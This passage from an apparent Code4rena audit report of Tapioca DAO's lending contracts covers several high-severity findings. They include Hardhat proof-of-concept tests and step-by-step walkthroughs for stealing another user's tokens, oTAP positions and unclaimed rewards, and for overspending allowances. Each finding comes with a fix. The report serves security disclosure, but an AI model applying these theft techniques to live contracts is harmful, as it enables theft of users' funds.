            (await bar.clonesOfCount(mediumRiskMC.address)).sub(1)
        ),
        SingularityArtifact.abi,
        ethers.provider
    ).connect(deployer)

    //Deploy & set LiquidationQueue
    await usd0.setMinterStatus(wethUsdoSingularity.address, true)
    await usd0.setBurnerStatus(wethUsdoSingularity.address, true)

    const LiquidationQueueFactory = await ethers.getContractFactory(
        "LiquidationQueue"
    )
    const liquidationQueue = await LiquidationQueueFactory.deploy()

    const feeCollector = new ethers.Wallet(
        ethers.Wallet.createRandom().privateKey,
        ethers.provider
    )

    const { stableToUsdoBidder } = await deployCurveStableToUsdoBidder(
        deployer,
        bar,
        usdc,
        usd0
    )

    const LQ_META = {
        activationTime: 600, // 10min
        minBidAmount: ethers.BigNumber.from((1e18).toString()).mul(200), // 200 USDC
        closeToMinBidAmount: ethers.BigNumber.from((1e18).toString()).mul(202),
        defaultBidAmount: ethers.BigNumber.from((1e18).toString()).mul(400), // 400 USDC
        feeCollector: feeCollector.address,
        bidExecutionSwapper: ethers.constants.AddressZero,
        usdoSwapper: stableToUsdoBidder.address,
    }
    await liquidationQueue.init(LQ_META, wethUsdoSingularity.address)

    const payload = wethUsdoSingularity.interface.encodeFunctionData(
        "setLiquidationQueueConfig",
        [
            liquidationQueue.address,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
        ]
    )

    await (
        await bar.executeMarketFn(
            [wethUsdoSingularity.address],
            [payload],
            true
        )
    ).wait()

    const usdoAmount = ethers.BigNumber.from((1e18).toString()).mul(10)
    const usdoShare = await yieldBox.toShare(usdoAssetId, usdoAmount, false)
    await usd0.mint(deployer.address, usdoAmount)

    const depositAssetEncoded = yieldBox.interface.encodeFunctionData(
        "depositAsset",
        [usdoAssetId, deployer.address, deployer.address, 0, usdoShare]
    )

    const sglLendEncoded = wethUsdoSingularity.interface.encodeFunctionData(
        "addAsset",
        [deployer.address, deployer.address, false, usdoShare]
    )

    await usd0.approve(magnetar.address, ethers.constants.MaxUint256)
    await usd0.approve(yieldBox.address, ethers.constants.MaxUint256)
    await usd0.approve(wethUsdoSingularity.address, ethers.constants.MaxUint256)
    await yieldBox.setApprovalForAll(deployer.address, true)
    await yieldBox.setApprovalForAll(wethUsdoSingularity.address, true)
    await yieldBox.setApprovalForAll(magnetar.address, true)
    await weth.approve(yieldBox.address, ethers.constants.MaxUint256)
    await weth.approve(magnetar.address, ethers.constants.MaxUint256)
    await wethUsdoSingularity.approve(
        magnetar.address,
        ethers.constants.MaxUint256
    )
    const calls = [
        {
            id: 100,
            target: yieldBox.address,
            value: 0,
            allowFailure: false,
            call: depositAssetEncoded,
        },
        {
            id: 203,
            target: wethUsdoSingularity.address,
            value: 0,
            allowFailure: false,
            call: sglLendEncoded,
        },
    ]

    await magnetar.connect(deployer).burst(calls)

    const ybBalance = await yieldBox.balanceOf(deployer.address, usdoAssetId)
    expect(ybBalance.eq(0)).to.be.true

    const sglBalance = await wethUsdoSingularity.balanceOf(deployer.address)
    expect(sglBalance.gt(0)).to.be.true

    const borrowAmount = ethers.BigNumber.from((1e17).toString())
    await timeTravel(86401)
    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(1)
    await weth.freeMint(wethMintVal)

    await wethUsdoSingularity
        .connect(deployer)
        .approveBorrow(magnetar.address, ethers.constants.MaxUint256)

    const borrowFn = magnetar.interface.encodeFunctionData(
        "depositAddCollateralAndBorrowFromMarket",
        [
            wethUsdoSingularity.address,
            deployer.address,
            wethMintVal,
            0,
            true,
            true,
            {
                withdraw: false,
                withdrawLzFeeAmount: 0,
                withdrawOnOtherChain: false,
                withdrawLzChainId: 0,
                withdrawAdapterParams: ethers.utils.toUtf8Bytes(""),
            },
        ]
    )

    let borrowPart = await wethUsdoSingularity.userBorrowPart(deployer.address)
    expect(borrowPart.eq(0)).to.be.true
    await magnetar.connect(deployer).burst(
        [
            {
                id: 206,
                target: magnetar.address,
                value: ethers.utils.parseEther("2"),
                allowFailure: false,
                call: borrowFn,
            },
        ],
        {
            value: ethers.utils.parseEther("2"),
        }
    )

    const collateralBalance = await wethUsdoSingularity.userCollateralShare(
        deployer.address
    )
    const collateralAmpunt = await yieldBox.toAmount(
        wethAssetId,
        collateralBalance,
        false
    )
    expect(collateralAmpunt.eq(wethMintVal)).to.be.true

    const totalAsset = await wethUsdoSingularity.totalSupply()

    await wethUsdoSingularity
        .connect(deployer)
        .borrow(deployer.address, deployer.address, borrowAmount)

    borrowPart = await wethUsdoSingularity.userBorrowPart(deployer.address)
    expect(borrowPart.gte(borrowAmount)).to.be.true

    const receiverSplit = deployer.address.split("0x")
    await magnetar
        .connect(eoa1)
        .withdrawToChain(
            yieldBox.address,
            deployer.address,
            usdoAssetId,
            0,
            "0x".concat(receiverSplit[1].padStart(64, "0")),
            borrowAmount,
            0,
            "0x00",
            deployer.address,
            0
        )

    const usdoBalanceOfDeployer = await usd0.balanceOf(deployer.address)
    expect(usdoBalanceOfDeployer.eq(borrowAmount)).to.be.true
})
```

</details>

This test passes, showing that the `eoa1` address is able to withdraw tokens belonging to the deployer.

### Tools Used

Hardhat

### Recommended Mitigation Steps

Add approval checks to all functions in the Magnetar contract.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1019#issuecomment-1701385949)**

***

## [[H-39] `AaveStrategy.sol`: Changing swapper breaks the contract](https://github.com/code-423n4/2023-07-tapioca-findings/issues/990)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/990), also found by [0xfuje](https://github.com/code-423n4/2023-07-tapioca-findings/issues/735), [Vagner](https://github.com/code-423n4/2023-07-tapioca-findings/issues/416), [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/826), [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/244), and [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/222)*

The contract `AaveStrategy.sol` manages wETH tokens and deposits them to the aave lending pool, and collects rewards. These rewards are then swapped into WETH again to compound on the WETH being managed by the contract. this is done in the `compound` function.

```solidity
uint256 calcAmount = swapper.getOutputAmount(swapData, "");
uint256 minAmount = calcAmount - (calcAmount * 50) / 10_000; //0.5%
swapper.swap(swapData, minAmount, address(this), "");
```

To carry out these operations, the swapper contract needs to be given approval to use the tokens being stored in the strategy contract. This is required since the swapper contract calls transferFrom on the tokens to pull it out of the strategy contract. This allowance is set in the constructor.

```solidity
rewardToken.approve(_multiSwapper, type(uint256).max);
```

The issue arises when the swapper contract is changed. The change is done via the `setMultiSwapper` function. This function however does not give approval to the new swapper contract. Thus if the swapper is upgraded/changed, the approval is not transferred to the new swapper contract, which makes the swappers dysfunctional.

Since the swapper is critical to the system, and `compound` is called before withdrawals, a broken swapper will break the withdraw functionality of the contract. Thus this is classified as a high severity issue.

### Proof of Concept

The bug is due to the absence of `approve` calls in the `setMultiSwapper` function. This can be seen from the implementation of the function.

```solidity
function setMultiSwapper(address _swapper) external onlyOwner {
        emit MultiSwapper(address(swapper), _swapper);
        swapper = ISwapper(_swapper);
    }
```
### Recommended Mitigation Steps

In the `setMultiSwapper` function, remove approval from the old swapper and add approval to the new swapper. The same function has the proper implementation in the `ConvexTricryptoStrategy.sol` contract which can be used here as well.

```solidity
function setMultiSwapper(address _swapper) external onlyOwner {
    emit MultiSwapper(address(swapper), _swapper);
    rewardToken.approve(address(swapper), 0);
    swapper = ISwapper(_swapper);
    rewardToken.approve(_swapper, type(uint256).max);
}
```

**[0xRektora (Tapioca) confirmed via duplicate issue 222](https://github.com/code-423n4/2023-07-tapioca-findings/issues/222)**

***

## [[H-40] `BalancerStrategy.sol`: `_withdraw` withdraws insufficient tokens](https://github.com/code-423n4/2023-07-tapioca-findings/issues/978)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/978), also found by [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/964), [n1punp](https://github.com/code-423n4/2023-07-tapioca-findings/issues/279), and [chaduke](https://github.com/code-423n4/2023-07-tapioca-findings/issues/51)*

The funciton `_withdraw` in the balancer strategy contract is called during withdraw operations to withdraw WETH from the balancer pool. The function calculats the amount to withdraw, and then calls `_vaultWithdraw` function.

```solidity
if (amount > queued) {
            uint256 pricePerShare = pool.getRate();
            uint256 decimals = IStrictERC20(address(pool)).decimals();
            uint256 toWithdraw = (((amount - queued) * (10 ** decimals)) /
                pricePerShare);

            _vaultWithdraw(toWithdraw);
        }
```

The function `_vaultWithdraw` submits an exit request with the following userData.

```solidity
exitRequest.userData = abi.encode(
            2,
            exitRequest.minAmountsOut,
            pool.balanceOf(address(this))
        );
```

A value of 2 here corresponds to specifying the exact number of tokens coming out of the contract. Thus the function `_vaultWithdraw` will withdraw the exact number of tokens passed to it in its parameter.

The issue however is that the function `_vaultWithdraw` is not called with the amount of tokens needed to be withdrawn, it is called by the amount scaled down by `pricePerShare`. Thus if the actual withdrawn amount is less the amounts the user actually wanted. This causes a revert in the next step.

```solidity
require(
            amount <= wrappedNative.balanceOf(address(this)),
            "BalancerStrategy: not enough"
        );
```

Since an insuffucient amount of tokens are withdrawn, this step will revert if there arent enough spare tokens in the contract. Since the contract incorrectly scales doen the withdraw amount and causes a revert, this is classified as a high severity issue.

### Proof of Concept

The following exercise shows that passing the same `exitRequest` data to the balancerPool actually extracts the exact number of tokens as specified in `minamountsOut`.

A position is created on optimism's weth-reth pool. The `userData` is generated using the following code.

````solidity
```solidity
function temp() external pure returns(bytes memory){
    uint256[] memory amts = new uint256[](2);
    amts[0] = 500;
    amts[1] = 0;
    uint256 max = 20170422329691;
    return(abi.encode(2,amts,max));
}
````

Min amount out of WETH is set to 500 wei. The `exitRequest`is then constructed as follows with the userData from above.

```json
{
    "assets": [
        "0x4200000000000000000000000000000000000006",
        "0x9bcef72be871e61ed4fbbc7630889bee758eb81d"
    ],
    "minAmountsOut": ["500", "0"],
    "toInternalBalance": false,
    "userData": "0x00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000012584adba15b000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000001f40000000000000000000000000000000000000000000000000000000000000000"
}
```

This is an exit request of type 2, which specifies the exact amount of tokens to be withdrawn. This transaction was then run on tenderly to check how many tokens are withdrawn. From the screenshot [here](https://gist.github.com/carrotsmuggler/707aa76f78028d6fc66d5ba630d8d677) from tenderly we can see only 500 wei of WETH is withdrawn.

This proves that the `_vaultWithdraw` function withdraws the exact amount of tokens passed to it as a parameter. Since the passed parameter is scaled down by `pricePerShare`, this leads to an insufficient amount withdrawn, and eventually a revert.

### Tools Used

Tenderly

### Recommended Mitigation Steps

Pass the amount to be withdrawn without scaling it down by `pricePerShare`.

**[0xRektora (Tapioca) confirmed via duplicate issue 51](https://github.com/code-423n4/2023-07-tapioca-findings/issues/51)**

***

## [[H-41] Rewards compounded in AaveStrategy are unredeemable](https://github.com/code-423n4/2023-07-tapioca-findings/issues/943)
*Submitted by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/943), also found by [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/820) and [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/243)*

The AaveStrategy contract is designed to:

1.  Receive depositor's ERC20 tokens from yieldBox
2.  Deposit those tokens into an AAVE lending pool
3.  Allow anyone to call `compound()`, which:
    a. Claims AAVE rewards from the `incentivesController`
    b. Claims staking rewards from the `stakingRewardToken` (stkAAVE)
    c. Redeeming staking rewards is only possible within a certain cooldown window that is set by AAVE governance. The function resets the cooldown if either 12 days have passed since the cooldown was last initiated, or if the strategy has a stakedRewardToken balance
    d. Swaps any received `rewardToken` (&#36;AAVE) for `wrappedNative`
    e. Deposits the `wrappedNative` received in the swap into the lending pool

There are several issues with this flow, but this vulnerability report is specific to redeeming staked rewards. The incentives controller specified in the `mainnet.env` file is at address 0xd784927Ff2f95ba542BfC824c8a8a98F3495f6b5 (proxy). Its `claimRewards` function stakes tokens directly:

      function _claimRewards(
        ...
      ) internal returns (uint256) {
        ...
        uint256 accruedRewards = _claimRewards(user, userState);
        ...
        STAKE_TOKEN.stake(to, amountToClaim); //@audit claimed rewards are staked immediately
        ...
      }

The only way to retrieve tokens once staked is via a call to `stakingRewardToken#redeem()`, which is not present in the AaveStrategy contract. As a result, any rewards accumulated via the incentiveController would not be claimable.

### Impact

High - Loss of funds

### Proof of concept

This is unfortunately difficult to PoC as the AAVE incentive/staking rewards do not accumulate properly in the fork tests, and the mocks do not exhibit the same behavior.

### Recommended Mitigation Steps

Include a call to redeem in `compound()`.

**[0xRektora (Tapioca) confirmed via duplicate issue 243](https://github.com/code-423n4/2023-07-tapioca-findings/issues/243)**

***

## [[H-42] Attacker can steal victim's oTAP position contents via `MagnetarMarketModule#_exitPositionAndRemoveCollateral()`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/936)
*Submitted by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/936), also found by [zzebra83](https://github.com/code-423n4/2023-07-tapioca-findings/issues/498)*

NOTE: This vulnerability relies on the team implementing an `onERC721Received()` function in Magnetar. As is currently written, attempts to exit oTAP positions via Magnetar will always revert as Magnetar cannot receive ERC721s, despite this being the clear intention of the function. This code path was not covered in the tests. Once implemented, however, an attack vector to steal twAML-locked oTAP positions opens.

Also, this is a similar but distinct attack vector from #933.

`MagnetarMarketModule#_exitPositionAndRemoveCollateral()` is a complex function used to perform any combination of: exiting an oTAP position, unlocking a locked tOLP position, removing assets and collateral from Singularity/bigBang, and repaying loans. The function achieves this by employing separate "if" clauses for each task that the caller would like to perform. These clauses are entered based on flags the caller provides in the argument struct `removeAndRepayData`.

Along with the set of operations to perform, the caller also provides:

*   address `user` to operate on
*   address externalData.bigBang
*   address externalData.singularity
*   address yieldbox (obtained by calling the user-provided `ISingularity(externalData.singularity).yieldBox()`)

As the caller has full control of all of these parameters, he can execute attacks to steal assets that have been approved to Magnetar.

### Impact

High - Theft of funds

### Proof of concept

Unfortunately the Magnetar tests do not cover the case where we wish to exit our oTAP position, and the periphery testing infrastructure does not include helper functions for the oTAP workflows (at least that I was able to find). This makes a coded PoC difficult and time consuming. Please consider the following walkthrough and reach out if a coded example is necessary.

In this case, we're going to assume that a victim wants to use this function as-designed to exit his twAML-locked oTAP position. In order to do so he needs to grant approval in  for Magnetar to transfer his position.

Once approved, anyone can call `_exitPositionAndRemoveCollateral()` with his own set of target addresses (some valid Tapioca addresses, some attacker-owned contracts) and the approver as `user`.

The attack is as follows:

1.  Victim approves Magnetar to control his oTAP positions
2.  Attacker first calls `_exitPositionAndRemoveCollateral()`, with:
    *   `removeAndRepayData.exitData.exit = true`
    *   `removeAndRepayData.unlockData.unlock = true`
    *   The `user` to steal from
    *   the `tokenId` to exit + steal
    *   removeAndRepayData.unlockData.target = an attacker-controlled contract that just passes when called with `.unlock()`
3.  Magnetar transfers the oTAP position to itself and exits the position. It retains the yieldbox shares at the end of the call
4.  Attacker calls `_exitPositionAndRemoveCollateral()`, with:
    *   removeAndRepayData.exitData.exit = false
    *   removeAndRepayData.unlockData.unlock = true
    *   The `user` is the attacker's address for receiving the unlocked shares
    *   the tokenId to exit + steal
    *   removeAndRepayData.unlockData.target = the real tOLP contract

(The attacker could have alternately used a similar bigBang attacker contract approach for removing the yieldbox shares in step 4 as in #933 )

<details>

```solidity
function _exitPositionAndRemoveCollateral( // @audit called via delegatecall from core MagnetarV2 w/o any agument validation 
    address user,
    ICommonData.ICommonExternalContracts calldata externalData,
    IUSDOBase.IRemoveAndRepay calldata removeAndRepayData
) private {
    IMarket bigBang = IMarket(externalData.bigBang); // @audit all 3 of these can be attacker controlled
    ISingularity singularity = ISingularity(externalData.singularity);
    IYieldBoxBase yieldBox = IYieldBoxBase(singularity.yieldBox()); 

    uint256 tOLPId = 0;
    if (removeAndRepayData.exitData.exit) { // @audit true, enter this block
        require(
            removeAndRepayData.exitData.oTAPTokenID > 0, // @audit oTAP ID we want to unlock+steal 
            "Magnetar: oTAPTokenID 0"
        );

        address oTapAddress = ITapiocaOptionsBroker(
            removeAndRepayData.exitData.target // @audit target here is attacker-controlled, but retrieve the real oTAP address
        ).oTAP();
        (, ITapiocaOptions.TapOption memory oTAPPosition) = ITapiocaOptions( // @audit get the oTAP postion we're exiting
            oTapAddress
        ).attributes(removeAndRepayData.exitData.oTAPTokenID);

        tOLPId = oTAPPosition.tOLP;

        address ownerOfTapTokenId = IERC721(oTapAddress).ownerOf(
            removeAndRepayData.exitData.oTAPTokenID
        );
        require(
            ownerOfTapTokenId == user || ownerOfTapTokenId == address(this), // @audit owner is user, passes
            "Magnetar: oTAPTokenID owner mismatch"
        );
        if (ownerOfTapTokenId == user) { // @audit true
            IERC721(oTapAddress).safeTransferFrom( // @audit transfer the token here 
                user,
                address(this),
                removeAndRepayData.exitData.oTAPTokenID,
                "0x"
            );
        }
        ITapiocaOptionsBroker(removeAndRepayData.exitData.target) // @audit address is 
            .exitPosition(removeAndRepayData.exitData.oTAPTokenID);

        if (!removeAndRepayData.unlockData.unlock) { // @audit unlock = true, skip this
            IERC721(oTapAddress).safeTransferFrom(
                address(this),
                user,
                removeAndRepayData.exitData.oTAPTokenID,
                "0x"
            );
        }
    }

    // performs a tOLP.unlock operation
    if (removeAndRepayData.unlockData.unlock) { 
        if (removeAndRepayData.unlockData.tokenId != 0) {
            if (tOLPId != 0) {
                require(
                    tOLPId == removeAndRepayData.unlockData.tokenId,
                    "Magnetar: tOLPId mismatch"
                );
            }
            tOLPId = removeAndRepayData.unlockData.tokenId;
        }
        // @audit .target here is attacker controlled  - just pass first time!
        //        Second time, the attacker specifies the real tOLP contract and themselves as "user" to have the tokens unlocked to their address
        ITapiocaOptionLiquidityProvision(
            removeAndRepayData.unlockData.target 
        ).unlock(tOLPId, externalData.singularity, user);
    }
```

</details>

### Recommended Mitigation Steps

*   Do not allow arbitrary address input in these complex, multi-use functions.
*   Consider breaking this into multiple standalone functions
*   Require user == msg.sender

**[ > 0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/936#issuecomment-1701318846)**

***

## [[H-43] Accounted balance of GlpStrategy does not match withdrawable balance, allowing for attackers to steal unclaimed rewards](https://github.com/code-423n4/2023-07-tapioca-findings/issues/932)
*Submitted by [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/932), also found by kaden ([1](https://github.com/code-423n4/2023-07-tapioca-findings/issues/955), [2](https://github.com/code-423n4/2023-07-tapioca-findings/issues/925)) and [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/785)*

Attackers can steal unclaimed rewards due to insufficient accounting.

### Proof of Concept

Pricing of shares for Yieldbox strategies is dependent upon the total underlying balance of the strategy. We can see below how we mint an amount of shares according to this underlying amount.

```solidity
// depositAsset()
uint256 totalAmount = _tokenBalanceOf(asset);
if (share == 0) {
	// value of the share may be lower than the amount due to rounding, that's ok
	share = amount._toShares(totalSupply[assetId], totalAmount, false);
} else {
	// amount may be lower than the value of share due to rounding, in that case, add 1 to amount (Always round up)
	amount = share._toAmount(totalSupply[assetId], totalAmount, true);
}

_mint(to, assetId, share);
```

The total underlying balance of the strategy is obtained via `asset.strategy.currentBalance`.

```solidity
function _tokenBalanceOf(Asset storage asset) internal view returns (uint256 amount) {
	return asset.strategy.currentBalance();
}
```

`GlpStrategy._currentBalance` does not properly track all unclaimed rewards.

```solidity
function _currentBalance() internal view override returns (uint256 amount) {
	// This _should_ included both free and "reserved" GLP:
	amount = IERC20(contractAddress).balanceOf(address(this));
}
```

As a result, attackers can:

*   Deposit a high amount when there are unclaimed rewards
    *   Receiving a higher amount of shares than they would if accounting included unclaimed rewards
    *   Harvests unclaimed rewards, increasing `_currentBalance`, only after they received shares
*   Withdraw all shares
    *   Now that the balance is updated to include previously unclaimed rewards, the attacker profits their relative share of the unclaimed rewards
        *   The more the attacker deposits relative to the strategy balance, the greater proportion of interest they receive

### Recommended Mitigation Steps

It's recommended that `_currentBalance` include some logic to retrieve the amount and value of unclaimed rewards to be included in it's return value.



**[cryptolyndon (Tapioca confirmed)](https://github.com/code-423n4/2023-07-tapioca-findings/issues/932#issuecomment-1678481117)**

***

## [[H-44] `BigBang::repay` and `Singularity::repay` spend more than allowed amount](https://github.com/code-423n4/2023-07-tapioca-findings/issues/918)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/918)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L268> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L721-L732> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLLendingCommon.sol#L83-L95> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLBorrow.sol#L45-L52>

When an user allows certain amount to a spender, the spender can spend more than the allowance.

Note that this is a different issue from the misuse of `allowedBorrow` for the share amount
(i.e. issue "`BigBang::repay` uses `allowedBorrow` with the asset amount, whereas other functions use it with share of collateral"), as the fix in the other issue will not mitigate this issue.
This issue is the misuse of `part` and `elastic`, whereas the other issue is the misuse of the `share` and `asset`.

### Proof of Concept

The spec in the `MarketERC20::approve` function specifies that the approved amount is the maximum amount that the spender can draw.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/364dead3a42b06a34c802eee951cea1a654d438e/contracts/markets/MarketERC20.sol#L189-L200>

        /// @notice Approves `amount` from sender to be spend by `spender`.
        /// @param spender Address of the party that can draw from msg.sender's account.
        /// @param amount The maximum collective amount that `spender` can draw.
        /// @return (bool) Returns True if approved.
        function approve( 
            address spender,
            uint256 amount
        ) public override returns (bool) {

However, the spender can draw more than the allowance if the `totalBorrow.base` is more thant `totalBorrow.elastic`, which is likely condition.

The proof of concept below demonstrates that more asset was pulled than allowed.
It is only a part of proof of concept; to see the full proof of concept see <https://gist.github.com/zzzitron/8dd809c0ea39dc0ea727534c3ba804f9>
To use it, put it in the `test/bigBang.test.ts` in the tapiocabar-audit repo

The eoa1 allows deployer 1e18. After the `timeTravel`, the elastic of `totalBorrow` is more than the `base`. Under the condition, the deployer uses the allowance with the `BigBang::repay` function. As the result, more asset than allowance was pulled from eoa1.

```javascript
        it('should not allow repay more PoCRepayMoreThanAllowed', async () => {
            
            ////////
            // setup steps are omitted
            // the full proof of concept is
            // https://gist.github.com/zzzitron/8dd809c0ea39dc0ea727534c3ba804f9
            ////////

            // eoa1 allows deployer (it should be `approve`, if the modifier in the repay is `allowedLend`)
            const allowedPart = ethers.BigNumber.from((1e18).toString());
            await wethBigBangMarket.connect(eoa1).approveBorrow(deployer.address, allowedPart);

            //repay from eoa1
            // check more than the allowed amount is pulled from yieldBox
           
            timeTravel(10 * 86400);

            // repay from eoa1 the allowed amount
            // balance before repay of eoa in the yieldBox for the asset
            const usdoAssetId = await wethBigBangMarket.assetId();
            const eoa1ShareBalanceBefore = await yieldBox.balanceOf(eoa1.address, usdoAssetId);
            const eoa1AmountBefore = await yieldBox.toAmount(usdoAssetId, eoa1ShareBalanceBefore, false);
            await wethBigBangMarket.repay(
                eoa1.address,
                deployer.address,
                false,
                allowedPart,
            );
            const eoa1ShareBalanceAfter = await yieldBox.balanceOf(eoa1.address, usdoAssetId);
            const eoa1AmountAfter = await yieldBox.toAmount(usdoAssetId, eoa1ShareBalanceAfter, false);
            console.log(eoa1AmountBefore.sub(eoa1AmountAfter).toString());
            expect(eoa1AmountBefore.sub(eoa1AmountAfter).gt(allowedPart)).to.be.true;
        });
```

The result of the poc is below, which shows that `1000136987569097987` is pulled from the eoa1, which is more than the allowance (i.e. 1e18).

      BigBang test
        poc
    1000136987569097987
          ✔ should not allow repay more PoCRepayMoreThanAllowed (11934ms)

The same issue is also in the `Singularity`. In the same manner shown above, the spender will pull more than allowed when the `totalBorrow.elastic` is bigger than the `totalBorrow.base`.

### Details of the bug

The function `BigBang::repay` uses `part` to check for the allowance.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L268>

However, the `BigBang::_repay` draws actually the corresponding `elastic` of the `part` from the `from` address.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L721-L732>

```solidity
    function _repay(
        address from,
        address to,
        uint256 part
    ) internal returns (uint256 amount) {
        (totalBorrow, amount) = totalBorrow.sub(part, true);

        userBorrowPart[to] -= part;

        uint256 toWithdraw = (amount - part); //acrrued
        uint256 toBurn = amount - toWithdraw;
        yieldBox.withdraw(assetId, from, address(this), amount, 0);
```

The similar lines of code is also in the `Singularity`. The `Singularity::repay` will delegate call on the `SGLBorrow::repay`, which has the modifier of `allowedBorrow(from, part)`:

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLBorrow.sol#L45-L51>

```solidity
// SGLBorrow

    function repay(
        address from,
        address to,
        bool skim,
        uint256 part
    ) public notPaused allowedBorrow(from, part) returns (uint256 amount) {
        updateExchangeRate();

```

Then, `amount` is calculated from the `part`, and the `amount` is pulled from the `from` address in the below code snippet.

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLLendingCommon.sol#L83-L95>

```solidity
    function _repay(
        address from,
        address to,
        bool skim,
        uint256 part
    ) internal returns (uint256 amount) {
        (totalBorrow, amount) = totalBorrow.sub(part, true);

        userBorrowPart[to] -= part;

        uint256 share = yieldBox.toShare(assetId, amount, true);
        uint128 totalShare = totalAsset.elastic;
        _addTokens(from, to, assetId, share, uint256(totalShare), skim);
        totalAsset.elastic = totalShare + uint128(share);
        emit LogRepay(skim ? address(yieldBox) : from, to, amount, part);
    }
```

The `amount` is likely to be bigger than the `part`, since the calculation is based on the `totalBorrow`'s ratio between `elastic` and `base`.
Then the `amount` is used to withdraw from `from` address, meaning that more than the allowance is withdrawn.

The discrepancy between the allowance and actually spendable amount is going to grow in time, as the `totalBorrow`'s elastic will outgrow the base in time.

### Tools Used

Hardhat

### Recommended Mitigation Steps

Instead of using the `part` to check the allowance, calculate the actual amount to be pulled and use the amount to check the allowance.

<!-- zzzitron H-BigBang-PoCRepayMoreThanAllowed -->

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/918#issuecomment-1701266875)**

***

## [[H-45] `SGLLiquidation::_computeAssetAmountToSolvency`, `Market::_isSolvent` and `Market::_computeMaxBorrowableAmount` may overestimate the collateral, resulting in false solvency](https://github.com/code-423n4/2023-07-tapioca-findings/issues/915)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/915)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L385-L399> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L781-L785> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L80-L87>

An user can borrow via `BigBang::borrow` when there is no collateral amount from the user's share. The `BigBang` will falsely consider the position as solvent, when it is not, resulting in a loss.

A similar issue presents in the Singularity as `SGLLiquidation::_computeAssetAmountToSolvency` will overestimate the collateral, therefore liquidate less than it should.

### Proof of Concept

The following proof of concept demonstrates that au user could borrow some assets, even though the collateral share will not give any amount of collateral.

Put the full PoC in the following gist into `test/bigBang.test.ts` in tapiocabar-audit.

<https://gist.github.com/zzzitron/14482ea3ab35b08421e7751bac0c2e3f>

<details>

```javascript
        it('considers me solvent even when I have enough share for any amount PoCBorrow', async () => {
            ///////
            // setup is omitted
            // full poc is https://gist.github.com/zzzitron/14482ea3ab35b08421e7751bac0c2e3f
            ///////

            const wethCollateralShare = ethers.BigNumber.from((1e8).toString()).sub(1);
            await wethBigBangMarket.addCollateral(
                deployer.address,
                deployer.address,
                false,
                0,
                wethCollateralShare,
                // valShare,
            );

            // log
            let userCollateralShare = await wethBigBangMarket.userCollateralShare(deployer.address);
            console.log("userCollateralShare: ", userCollateralShare.toString());
            let userCollateralShareToAmount = await yieldBox.toAmount(wethAssetId, userCollateralShare, false);
            console.log("userCollateralShareToAmount: ", userCollateralShareToAmount.toString());
            let collateralPartInAsset = (await yieldBox.toAmount(wethAssetId, userCollateralShare.mul(1e13).mul(75000), false))
            console.log("collateralPart in asset times exchangerRate", collateralPartInAsset.toString())
            const exchangeRate = await wethBigBangMarket.exchangeRate();
            console.log("exchangeRate:",exchangeRate.toString());
            console.log("can borrow this much:",collateralPartInAsset.div(exchangeRate).toString());


            //borrow even though the collateral share is not enough for any amount of collateral
            const usdoBorrowVal = collateralPartInAsset.div(exchangeRate).sub(1)

            await wethBigBangMarket.borrow(
                deployer.address,
                deployer.address,
                usdoBorrowVal,
            );

            let userBorrowPart = await wethBigBangMarket.userBorrowPart(
                deployer.address,
            );
            expect(userBorrowPart.gt(0)).to.be.true;
            console.log(userBorrowPart.toString())
        });
```

</details>

The result of the test is:

      BigBang test
        poc
